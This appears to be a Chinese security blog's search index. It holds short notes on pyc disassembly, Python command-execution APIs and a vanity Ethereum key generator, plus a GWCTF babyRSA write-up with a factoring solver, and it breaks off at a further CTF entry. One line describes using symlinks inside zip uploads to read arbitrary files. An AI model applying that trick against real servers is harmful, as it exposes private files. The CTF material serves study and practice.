<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>符号链接-任意文件访问</title>
    <url>/2024/02/27/Web/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>zip支持带符号链接压缩，可以将符号链接移植到其他系统上达成任意文件读取</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>dis反编译pyc</title>
    <url>/2024/04/13/python/dis%E5%8F%8D%E7%BC%96%E8%AF%91pyc/</url>
    <content><![CDATA[<p>MAGIC_NUMBER</p>
<p><a class="link"   href="https://github.com/zrax/pycdc/blob/6467c2cc52aa714876e131a1b6c6cf25f129460f/pyc_module.h#L7" >pycdc&#x2F;pyc_module.h at 6467c2cc52aa714876e131a1b6c6cf25f129460f · zrax&#x2F;pycdc (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum PycMagic &#123;</span><br><span class="line">    MAGIC_1_0 = 0x00999902,</span><br><span class="line">    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */</span><br><span class="line">    MAGIC_1_3 = 0x0A0D2E89,</span><br><span class="line">    MAGIC_1_4 = 0x0A0D1704,</span><br><span class="line">    MAGIC_1_5 = 0x0A0D4E99,</span><br><span class="line">    MAGIC_1_6 = 0x0A0DC4FC,</span><br><span class="line"></span><br><span class="line">    MAGIC_2_0 = 0x0A0DC687,</span><br><span class="line">    MAGIC_2_1 = 0x0A0DEB2A,</span><br><span class="line">    MAGIC_2_2 = 0x0A0DED2D,</span><br><span class="line">    MAGIC_2_3 = 0x0A0DF23B,</span><br><span class="line">    MAGIC_2_4 = 0x0A0DF26D,</span><br><span class="line">    MAGIC_2_5 = 0x0A0DF2B3,</span><br><span class="line">    MAGIC_2_6 = 0x0A0DF2D1,</span><br><span class="line">    MAGIC_2_7 = 0x0A0DF303,</span><br><span class="line"></span><br><span class="line">    MAGIC_3_0 = 0x0A0D0C3A,</span><br><span class="line">    MAGIC_3_1 = 0x0A0D0C4E,</span><br><span class="line">    MAGIC_3_2 = 0x0A0D0C6C,</span><br><span class="line">    MAGIC_3_3 = 0x0A0D0C9E,</span><br><span class="line">    MAGIC_3_4 = 0x0A0D0CEE,</span><br><span class="line">    MAGIC_3_5 = 0x0A0D0D16,</span><br><span class="line">    MAGIC_3_5_3 = 0x0A0D0D17,</span><br><span class="line">    MAGIC_3_6 = 0x0A0D0D33,</span><br><span class="line">    MAGIC_3_7 = 0x0A0D0D42,</span><br><span class="line">    MAGIC_3_8 = 0x0A0D0D55,</span><br><span class="line">    MAGIC_3_9 = 0x0A0D0D61,</span><br><span class="line">    MAGIC_3_10 = 0x0A0D0D6F,</span><br><span class="line">    MAGIC_3_11 = 0x0A0D0DA7,</span><br><span class="line">    MAGIC_3_12 = 0x0A0D0DCB,</span><br><span class="line"></span><br><span class="line">    INVALID = 0,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fd=<span class="built_in">open</span>(<span class="string">&#x27;xxx.pyc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        fd.read(i)</span><br><span class="line">        tmp=marshal.load(fd)<span class="comment">#不同版本位置可能不一样</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        dis.dis(tmp)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ifndef Py_OPCODE_H</span></span><br><span class="line"><span class="comment">#define Py_OPCODE_H</span></span><br><span class="line"><span class="comment">#ifdef __cplusplus</span></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Instruction opcodes <span class="keyword">for</span> compiled code */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STOP_CODE   0</span></span><br><span class="line"><span class="comment">#define POP_TOP     1</span></span><br><span class="line"><span class="comment">#define ROT_TWO     2</span></span><br><span class="line"><span class="comment">#define ROT_THREE   3</span></span><br><span class="line"><span class="comment">#define DUP_TOP     4</span></span><br><span class="line"><span class="comment">#define ROT_FOUR    5</span></span><br><span class="line"><span class="comment">#define NOP     9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define UNARY_POSITIVE  10</span></span><br><span class="line"><span class="comment">#define UNARY_NEGATIVE  11</span></span><br><span class="line"><span class="comment">#define UNARY_NOT   12</span></span><br><span class="line"><span class="comment">#define UNARY_CONVERT   13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define UNARY_INVERT    15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_POWER    19</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_MULTIPLY 20</span></span><br><span class="line"><span class="comment">#define BINARY_DIVIDE   21</span></span><br><span class="line"><span class="comment">#define BINARY_MODULO   22</span></span><br><span class="line"><span class="comment">#define BINARY_ADD  23</span></span><br><span class="line"><span class="comment">#define BINARY_SUBTRACT 24</span></span><br><span class="line"><span class="comment">#define BINARY_SUBSCR   25</span></span><br><span class="line"><span class="comment">#define BINARY_FLOOR_DIVIDE 26</span></span><br><span class="line"><span class="comment">#define BINARY_TRUE_DIVIDE 27</span></span><br><span class="line"><span class="comment">#define INPLACE_FLOOR_DIVIDE 28</span></span><br><span class="line"><span class="comment">#define INPLACE_TRUE_DIVIDE 29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SLICE       30</span></span><br><span class="line">/* Also uses <span class="number">31</span>-<span class="number">33</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_SLICE 40</span></span><br><span class="line">/* Also uses <span class="number">41</span>-<span class="number">43</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define DELETE_SLICE    50</span></span><br><span class="line">/* Also uses <span class="number">51</span>-<span class="number">53</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_MAP   54</span></span><br><span class="line"><span class="comment">#define INPLACE_ADD 55</span></span><br><span class="line"><span class="comment">#define INPLACE_SUBTRACT    56</span></span><br><span class="line"><span class="comment">#define INPLACE_MULTIPLY    57</span></span><br><span class="line"><span class="comment">#define INPLACE_DIVIDE  58</span></span><br><span class="line"><span class="comment">#define INPLACE_MODULO  59</span></span><br><span class="line"><span class="comment">#define STORE_SUBSCR    60</span></span><br><span class="line"><span class="comment">#define DELETE_SUBSCR   61</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_LSHIFT   62</span></span><br><span class="line"><span class="comment">#define BINARY_RSHIFT   63</span></span><br><span class="line"><span class="comment">#define BINARY_AND  64</span></span><br><span class="line"><span class="comment">#define BINARY_XOR  65</span></span><br><span class="line"><span class="comment">#define BINARY_OR   66</span></span><br><span class="line"><span class="comment">#define INPLACE_POWER   67</span></span><br><span class="line"><span class="comment">#define GET_ITER    68</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PRINT_EXPR  70</span></span><br><span class="line"><span class="comment">#define PRINT_ITEM  71</span></span><br><span class="line"><span class="comment">#define PRINT_NEWLINE   72</span></span><br><span class="line"><span class="comment">#define PRINT_ITEM_TO   73</span></span><br><span class="line"><span class="comment">#define PRINT_NEWLINE_TO 74</span></span><br><span class="line"><span class="comment">#define INPLACE_LSHIFT  75</span></span><br><span class="line"><span class="comment">#define INPLACE_RSHIFT  76</span></span><br><span class="line"><span class="comment">#define INPLACE_AND 77</span></span><br><span class="line"><span class="comment">#define INPLACE_XOR 78</span></span><br><span class="line"><span class="comment">#define INPLACE_OR  79</span></span><br><span class="line"><span class="comment">#define BREAK_LOOP  80</span></span><br><span class="line"><span class="comment">#define WITH_CLEANUP    81</span></span><br><span class="line"><span class="comment">#define LOAD_LOCALS 82</span></span><br><span class="line"><span class="comment">#define RETURN_VALUE    83</span></span><br><span class="line"><span class="comment">#define IMPORT_STAR 84</span></span><br><span class="line"><span class="comment">#define EXEC_STMT   85</span></span><br><span class="line"><span class="comment">#define YIELD_VALUE 86</span></span><br><span class="line"><span class="comment">#define POP_BLOCK   87</span></span><br><span class="line"><span class="comment">#define END_FINALLY 88</span></span><br><span class="line"><span class="comment">#define BUILD_CLASS 89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define HAVE_ARGUMENT   90  /* Opcodes from here have an argument: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_NAME  90  /* Index in name list */</span></span><br><span class="line"><span class="comment">#define DELETE_NAME 91  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define UNPACK_SEQUENCE 92  /* Number of sequence items */</span></span><br><span class="line"><span class="comment">#define FOR_ITER    93</span></span><br><span class="line"><span class="comment">#define LIST_APPEND 94</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_ATTR  95  /* Index in name list */</span></span><br><span class="line"><span class="comment">#define DELETE_ATTR 96  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define STORE_GLOBAL    97  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define DELETE_GLOBAL   98  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define DUP_TOPX    99  /* number of items to duplicate */</span></span><br><span class="line"><span class="comment">#define LOAD_CONST  100 /* Index in const list */</span></span><br><span class="line"><span class="comment">#define LOAD_NAME   101 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define BUILD_TUPLE 102 /* Number of tuple items */</span></span><br><span class="line"><span class="comment">#define BUILD_LIST  103 /* Number of list items */</span></span><br><span class="line"><span class="comment">#define BUILD_SET   104     /* Number of set items */</span></span><br><span class="line"><span class="comment">#define BUILD_MAP   105 /* Always zero for now */</span></span><br><span class="line"><span class="comment">#define LOAD_ATTR   106 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define COMPARE_OP  107 /* Comparison operator */</span></span><br><span class="line"><span class="comment">#define IMPORT_NAME 108 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define IMPORT_FROM 109 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define JUMP_FORWARD    110 /* Number of bytes to skip */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define JUMP_IF_FALSE_OR_POP 111 /* Target byte offset from beginning</span></span><br><span class="line">                                    of code */</span><br><span class="line"><span class="comment">#define JUMP_IF_TRUE_OR_POP 112 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define JUMP_ABSOLUTE   113 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define POP_JUMP_IF_FALSE 114   /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define POP_JUMP_IF_TRUE 115    /* &quot;&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LOAD_GLOBAL 116 /* Index in name list */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define CONTINUE_LOOP   119 /* Start of loop (absolute) */</span></span><br><span class="line"><span class="comment">#define SETUP_LOOP  120 /* Target address (relative) */</span></span><br><span class="line"><span class="comment">#define SETUP_EXCEPT    121 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define SETUP_FINALLY   122 /* &quot;&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LOAD_FAST   124 /* Local variable number */</span></span><br><span class="line"><span class="comment">#define STORE_FAST  125 /* Local variable number */</span></span><br><span class="line"><span class="comment">#define DELETE_FAST 126 /* Local variable number */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define RAISE_VARARGS   130 /* Number of raise arguments (1, 2 or 3) */</span></span><br><span class="line">/* CALL_FUNCTION_XXX opcodes defined below depend on this definition */</span><br><span class="line"><span class="comment">#define CALL_FUNCTION   131 /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define MAKE_FUNCTION   132 /* #defaults */</span></span><br><span class="line"><span class="comment">#define BUILD_SLICE     133 /* Number of items */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define MAKE_CLOSURE    134     /* #free vars */</span></span><br><span class="line"><span class="comment">#define LOAD_CLOSURE    135     /* Load free variable from closure */</span></span><br><span class="line"><span class="comment">#define LOAD_DEREF      136     /* Load and dereference from closure cell */ </span></span><br><span class="line"><span class="comment">#define STORE_DEREF     137     /* Store into cell */ </span></span><br><span class="line"></span><br><span class="line">/* The <span class="built_in">next</span> <span class="number">3</span> opcodes must be contiguous <span class="keyword">and</span> satisfy</span><br><span class="line">   (CALL_FUNCTION_VAR - CALL_FUNCTION) &amp; <span class="number">3</span> == <span class="number">1</span>  */</span><br><span class="line"><span class="comment">#define CALL_FUNCTION_VAR          140  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define CALL_FUNCTION_KW           141  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define CALL_FUNCTION_VAR_KW       142  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SETUP_WITH 143</span></span><br><span class="line"></span><br><span class="line">/* Support <span class="keyword">for</span> opargs more than <span class="number">16</span> bits long */</span><br><span class="line"><span class="comment">#define EXTENDED_ARG  145</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SET_ADD         146</span></span><br><span class="line"><span class="comment">#define MAP_ADD         147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum cmp_op &#123;PyCmp_LT=Py_LT, PyCmp_LE=Py_LE, PyCmp_EQ=Py_EQ, PyCmp_NE=Py_NE, PyCmp_GT=Py_GT, PyCmp_GE=Py_GE,</span><br><span class="line">         PyCmp_IN, PyCmp_NOT_IN, PyCmp_IS, PyCmp_IS_NOT, PyCmp_EXC_MATCH, PyCmp_BAD&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">#endif /* !Py_OPCODE_H */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>           <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>) <span class="comment">//2(地址) LOAD_CONST(操作符)          0 (0)(操作数)</span></span><br><span class="line">            <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">            <span class="number">6</span> IMPORT_NAME              <span class="number">0</span> (crypto)</span><br><span class="line">            <span class="number">8</span> STORE_NAME               <span class="number">0</span> (crypto)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python命令执行</title>
    <url>/2023/08/30/python/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>subprocess</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">command 命令</span></span><br><span class="line"><span class="string">shell 是否通过系统shell执行</span></span><br><span class="line"><span class="string">check 是否检查异常退出 如果为true则会在遇到异常退出的时候抛出异常</span></span><br><span class="line"><span class="string">capture_output 用于捕获命令的标准输出结果和标准错误结果</span></span><br><span class="line"><span class="string">text 以文本形式处理输入输出</span></span><br><span class="line"><span class="string">timeout 设定命令超时时间(s)</span></span><br><span class="line"><span class="string">input 执行命令后模拟输入字符 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">subprocess.check_output(command,shell,encoding)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用于执行结果直接获得输出结果</span></span><br><span class="line"><span class="string">command 指令</span></span><br><span class="line"><span class="string">shell 是否以系统shell执行</span></span><br><span class="line"><span class="string">encoding 输入输出的文本编码格式 如utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>os</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">os.popen()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用于获取对应指令的返回结果</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>不可逆混淆</title>
    <url>/2024/08/03/python/%E4%B8%8D%E5%8F%AF%E9%80%86%E6%B7%B7%E6%B7%86/</url>
    <content><![CDATA[<p><a class="link"   href="https://pyarmor.readthedocs.io/en/stable/topic/bccmode.html" >4.5. Insight Into BCC Mode — Pyarmor 8.5.11 documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://pyarmor.dashingsoft.com/index-zh.html" >Pyarmor - 加密 Python 脚本 (dashingsoft.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>特定id私钥生成脚本</title>
    <url>/2024/02/21/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/%E7%89%B9%E5%AE%9Aid%E7%A7%81%E9%92%A5%E7%94%9F%E6%88%90%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>所需库 web3</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> eth_account</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_address_suffix</span>(<span class="params">address, suffix</span>):</span><br><span class="line">    <span class="keyword">return</span> address[-<span class="number">4</span>:].lower() == suffix.lower()</span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="comment"># 使用安全的方式生成32字节的私钥</span></span><br><span class="line">    private_key_bytes = secrets.token_bytes(<span class="number">32</span>)</span><br><span class="line">    private_key_int = <span class="built_in">int</span>.from_bytes(private_key_bytes, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    private_key_hex = <span class="built_in">hex</span>(private_key_int)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建账户对象并获取地址</span></span><br><span class="line">    account = eth_account.Account.privateKeyToAccount(private_key_bytes)</span><br><span class="line">    address = account.address.lower()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查地址后四位是否为0x2024</span></span><br><span class="line">    <span class="keyword">if</span> check_address_suffix(address, <span class="string">&quot;2024&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到匹配地址: <span class="subst">&#123;address&#125;</span>，对应的私钥是: <span class="subst">&#123;private_key_hex&#125;</span>&quot;</span>)</span><br><span class="line">        found = <span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>智能合约</category>
      </categories>
  </entry>
  <entry>
    <title>GWCTF 2019babyRSA</title>
    <url>/2023/07/02/CTF%20WP/Crypto/GWCTF%202019babyRSA/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/247" >GWCTF 2019]babyRSA | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>观察主函数</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;GWHT&#123;******&#125;&#x27;</span></span><br><span class="line">secret = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">half = <span class="built_in">len</span>(flag) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag1 = flag[:half]</span><br><span class="line">flag2 = flag[half:]</span><br><span class="line"></span><br><span class="line">secret_num = getPrime(<span class="number">1024</span>) * bytes_to_long(secret)</span><br><span class="line"></span><br><span class="line">p = sympy.nextprime(secret_num)</span><br><span class="line">q = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">F1 = bytes_to_long(flag1)</span><br><span class="line">F2 = bytes_to_long(flag2)</span><br><span class="line"></span><br><span class="line">c1 = F1 + F2</span><br><span class="line">c2 = <span class="built_in">pow</span>(F1, <span class="number">3</span>) + <span class="built_in">pow</span>(F2, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span>(c2 &lt; N)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, e, N)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, e, N)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;N=&#x27;</span> + <span class="built_in">str</span>(N) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m1=&#x27;</span> + <span class="built_in">str</span>(m1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m2=&#x27;</span> + <span class="built_in">str</span>(m2) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>给了N,m1,m2</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">N=<span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">m1=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>此处p和q是两个相邻的素数</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p = sympy.nextprime(secret_num)</span><br><span class="line">q = sympy.nextprime(p)</span><br></pre></td></tr></table></figure></div>

<p>可以通过对N开根号求出后面的q(注意此处需要用sympy的sqrt，math库的sqrt无法求解这么大的数)</p>
<p>exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N=<span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">m1=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line">q=sympy.nextprime(sympy.sqrt(N))</span><br><span class="line">p=sympy.prevprime(q)</span><br><span class="line"><span class="built_in">print</span>(p*q==N)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=<span class="built_in">int</span>(sympy.invert(e,phi))</span><br><span class="line">c1=<span class="built_in">pow</span>(m1,d,N)</span><br><span class="line">c2=<span class="built_in">pow</span>(m2,d,N)</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">f=Solver()</span><br><span class="line">F1,F2=Int(<span class="string">&#x27;F1&#x27;</span>),Int(<span class="string">&#x27;F2&#x27;</span>)</span><br><span class="line">f.add(F1+F2==c1,<span class="built_in">pow</span>(F1,<span class="number">3</span>)+<span class="built_in">pow</span>(F2,<span class="number">3</span>)==c2)</span><br><span class="line"><span class="keyword">while</span> f.check()==sat:</span><br><span class="line">    m=f.model()</span><br><span class="line">    nF1,nF2=m[F1],m[F2]</span><br><span class="line">    f.add(Or(F1!=nF1,F2!=nF2))</span><br><span class="line">    flag1,flag2=long_to_bytes(<span class="built_in">int</span>(<span class="built_in">str</span>(nF1))),long_to_bytes(<span class="built_in">int</span>(<span class="built_in">str</span>(nF2)))</span><br><span class="line">    flag=flag1+flag2</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p>最终通过求解phi(N)（(p-1)*(q-1)）和e关于模phi(N)的逆元</p>
<p>通过公式 c&#x3D;pow(m,d,N)就可以求解出对应的明文了</p>
<p>结果（因为F1和F2等价所以有两个值）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307020011780.png"
                      alt="image-20230702001150741"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>BJDCTF 2020EasyRSA</title>
    <url>/2023/06/30/CTF%20WP/Crypto/BJDCTF%202020EasyRSA/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/689" >BJDCTF 2020]EasyRSA | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>题干</p>
